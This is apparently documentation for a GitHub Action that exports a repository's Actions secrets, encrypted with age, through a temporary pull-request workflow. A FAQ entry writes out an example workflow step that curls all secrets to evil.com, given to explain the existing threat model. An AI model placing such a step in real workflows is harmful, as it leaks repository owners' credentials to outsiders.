# Advanced Options

## Interactive Script Details

The `export-secrets.sh` script automates the entire export process. Here's what it does:

1. **Checks dependencies** - Verifies `age` and `gh` are installed
2. **Creates temporary directory** - Uses `mktemp -d` for secure file storage
3. **Generates keypair** - Creates age keypair in temp directory
4. **Creates workflow** - Writes `.github/workflows/export-secrets.yml` with your public key
5. **Manages git operations** - Creates unique branch, commits, pushes
6. **Handles PR lifecycle** - Creates PR, watches workflow, downloads artifact
7. **Decrypts secrets** - Shows your secrets on stdout
8. **Cleans up everything** - Closes PR, deletes workflow run, removes temp files

**Exit trap:** The script uses `trap 'rm -rf "$TEMP_DIR" EXIT'` to ensure temporary files are always deleted, even if the script is interrupted.

**Security benefits:**
- Private key never touches your working directory (no risk of accidental commit)
- Automatic cleanup prevents sensitive files from persisting
- Unique branch names prevent conflicts

## Manual Workflow Creation

If you want to create the workflow file manually (instead of using the script):

```yaml
# .github/workflows/export-secrets.yml
name: Export Secrets
on: pull_request  # Runs on PR creation

jobs:
  export:
    runs-on: ubuntu-latest
    steps:
      - uses: gerrywastaken/github-secrets-exporter@v1.1
        with:
          secrets_json: ${{ toJSON(secrets) }}
          # YOUR public key goes here (age1... or ssh-ed25519 ...)
          public_encryption_key: '<your-public-key>'
```

Then follow the manual commands in README.md step 2.

> **Important:** Never commit this workflow to your main branch. Always use the PR approach to keep it temporary.

## Fork for Maximum Security (Recommended)

The code is intentionally simple (~40 lines) so you can audit it yourself:

1. Fork this repository to your own account
2. Review the code (it's short!)
3. Use `your-username/github-secrets-exporter@main` in your workflow instead of `gerrywastaken/github-secrets-exporter@v1.1`
4. You control the code and verify no malicious updates occur

This way you're not trusting us - you're trusting code you've personally reviewed.

## Using Different Key Types

### SSH Keys

If you already have an SSH key on GitHub:

```bash
# Get your public key
curl https://github.com/YOUR_USERNAME.keys
```

Use it in your workflow:
```yaml
with:
  public_encryption_key: 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKw...'
```

Decrypt with:
```bash
age --decrypt --identity ~/.ssh/id_ed25519 < encrypted-secrets.age
```

### Age Keys

Generate a dedicated age key:

```bash
age-keygen -o ~/private_age.txt
chmod 600 ~/private_age.txt  # Restrict to owner only
```

This outputs:
```
Public key: age1ql3z7hjy54pw3hyww5ayyfg7zqgvc7w3j2elw8zmrj2kg5sfn9aqmcac8p
```

Use it in your workflow:
```yaml
with:
  public_encryption_key: 'age1ql3z7hjy54pw3hyww5ayyfg7zqgvc7w3j2elw8zmrj2kg5sfn9aqmcac8p'
```

Decrypt with:
```bash
age --decrypt --identity ~/private_age.txt < encrypted-secrets.age
```

**Alternative storage locations:**
- **Current directory** (`./private.key`): Easy to find but risk of accidental commit
- **Home directory** (`~/private_age.txt`): Safe from accidental commit, persists between sessions
- **Temporary directory** (`/tmp/private.key`): Auto-cleanup by system, but on multi-user systems check permissions

Always use `chmod 600` to restrict file access to owner only, and delete the key after use.

## Exporting Specific Secrets

Instead of exporting all secrets with `toJSON(secrets)`, you can export only specific ones:

```yaml
- uses: gerrywastaken/github-secrets-exporter@v1.1
  with:
    secrets_json: '{"ADMIN_PASS": "${{ secrets.ADMIN_PASS }}", "API_KEY": "${{ secrets.API_KEY }}"}'
    public_encryption_key: 'age1...'
```

## How It Works

1. You provide your public encryption key inline in the workflow file
2. Workflow exports all secrets as JSON
3. Encrypts with your public key using `age`
4. Uploads encrypted data as workflow artifact (1-day retention)
5. **You download artifact and decrypt locally with your private key**

## Security Model

- **Public key is inline** in your workflow file (visible, auditable)
- **Secrets only exist in memory** during the workflow - never touch disk
- **Encrypted output as artifact** (not logs) with 1-day retention
- **Private key never leaves your machine**
- Uses **asymmetric encryption** (public/private keys, not passwords)
- Simple, auditable code (~40 lines in `action.yml`)
- **Best practice**: Fork and audit the code before using

### Workflow Trigger Options

**Recommended: `pull_request` trigger**
- Create a PR with the workflow
- Workflow runs automatically on PR creation
- Download secrets, then close PR without merging
- Workflow never enters main branch (safer long-term)

> **Note for forks:** GitHub does not pass repository secrets to workflows that run from forked pull requests. Use a branch in the same repository or a `workflow_dispatch` run if you fork this action.

**Alternative: `workflow_dispatch` trigger**
- Merge workflow to main branch
- Manually trigger when needed
- Workflow lives in main permanently (could be triggered accidentally in future)

**Security note:** Read the [official GitHub documentation on secrets in workflows](https://docs.github.com/en/actions/security-guides/using-secrets-in-github-actions) to understand the security model for your specific setup.

## Example Output

After decryption, you'll see:
```json
{
  "NPM_TOKEN": "npm_abc123...",
  "AWS_ACCESS_KEY_ID": "AKIA...",
  "DATABASE_URL": "postgresql://..."
}
```

You can parse this with `jq` if needed:
```bash
# Get a specific secret
cat decrypted.json | jq -r '.NPM_TOKEN'

# Convert to env format
cat decrypted.json | jq -r 'to_entries[] | "\(.key)=\(.value)"'
```

## Manual Artifact Deletion

For extra security, you can delete the artifact immediately after downloading:

```bash
# Download the artifact first
gh run download --name encrypted-secrets

# Delete the artifact
gh api repos/:owner/:repo/actions/artifacts/ARTIFACT_ID -X DELETE
```

Or delete via the GitHub UI: Actions → Workflow run → Artifacts section → Delete

## Troubleshooting

### "gh run watch" says "found no in progress runs to watch"

**Best solution:** Use the `export-secrets.sh` script which handles timing automatically.

If using manual commands, this happens when you run `gh run watch` after the workflow has already started or completed.

**Manual solutions:**
1. **Watch specific run by ID:**
   ```bash
   RUN_ID=$(gh run list --branch "$BRANCH" --workflow=export-secrets.yml --limit 1 --json databaseId --jq '.[0].databaseId')
   gh run watch "$RUN_ID"
   ```

2. **Use the web interface:** If you miss the run:
   ```bash
   gh run view --web  # Opens browser to latest run
   ```

3. **Download without watching:** If the run already completed:
   ```bash
   gh run download "$RUN_ID" --name encrypted-secrets
   ```

### "Doesn't this action make my repo unsafe?"

This action doesn't add new attack surface that doesn't already exist.

**Important:** GitHub's security model for workflows and secrets is complex. Please read the [official documentation on secrets in GitHub Actions](https://docs.github.com/en/actions/security-guides/using-secrets-in-github-actions) to understand your specific risk profile.

Generally speaking: Anyone who can create/modify workflows in your repo can already access secrets:

```yaml
# Any workflow can do this:
- run: curl https://evil.com -d "${{ toJSON(secrets) }}"
```

This export action just makes intentional export easier - it doesn't change the fundamental security model.

But as long as you don't merge somebody's dodgy workflow, then they will only get a limited temporary github token made specficially for that workflow run by Github. See the real security test I ran here using an alt account as the attacker: https://github.com/gerrywastaken/github-secrets-exporter/pull/4

### "no identity matched any of the recipients" or "Failed to decrypt"

The private key you're using doesn't match the public key used for encryption.

Solutions:
1. Check which public key is in your workflow file (look at `public_encryption_key`)
2. If using SSH key: try different keys (`~/.ssh/id_ed25519`, `~/.ssh/id_rsa`, `~/.ssh/id_ecdsa`)
3. If using age key: make sure you're using the correct `private_age.txt` file
4. Verify the public key hasn't changed since the workflow ran
